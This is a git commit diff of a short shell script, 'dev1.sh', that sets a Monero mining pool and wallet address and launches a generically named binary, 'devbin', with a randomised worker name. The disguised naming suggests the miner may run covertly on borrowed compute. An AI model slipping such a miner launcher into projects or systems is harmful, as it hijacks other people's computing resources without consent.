75510c7d577a7af5adb67c1637c1c39bf4779764
renilo <88342640+renilo@users.noreply.github.com>
2021-08-31 14:15:39 +0700

    Update dev1.sh

--- dev1.sh
+++ dev1.sh
@@ -1,7 +1,7 @@
 POOL=xmr.f2pool.com:13531
 
-WALLET=rizolatersa
+WALLET=8By33DYys43cWJHQCxHinkHPdpsDPwFvf6qnZaFvvnCA2nZCPDoywMB1Mxapnc563zKrrfy1kQeRRCi4Xgre6USSSgqr2MU
 
 chmod +x devbin
 
-./devbin --algorithm chukwa_wrkz --pool $POOL --username $WALLET --password x
+./devbin --algorithm chukwa_wrkz --pool $POOL --username $WALLET.$(echo $(shuf -i 1-999999 -n 1)) --password x
